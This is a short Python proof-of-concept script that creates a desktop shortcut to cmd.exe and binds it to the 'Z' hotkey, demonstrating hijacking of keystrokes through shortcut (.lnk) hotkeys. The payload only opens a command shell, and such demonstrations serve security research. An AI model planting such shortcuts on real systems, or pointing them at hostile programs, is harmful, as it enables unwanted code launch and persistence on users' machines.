# Written by Ido Veltzman
#
# Imports
from os.path import join
import winshell

# Constants
HOTKEY = 90


def main():
    # Creating the shortcut on my desktop.
    shortcut = winshell.shortcut(join(winshell.desktop(), "poc.lnk"))

    # Setting my target path.
    shortcut.path = r"C:\Windows\System32\cmd.exe"

    # Adding description.
    shortcut.description = "Ido\'s POC to shortcut hotkey exploitation."

    # The best part - Setting up LNK's hotkey.
    # In our case the letter 'Z'.
    shortcut.hotkey = HOTKEY

    # Creating the shortcut.
    shortcut.write()


if __name__ == "__main__":
    main()
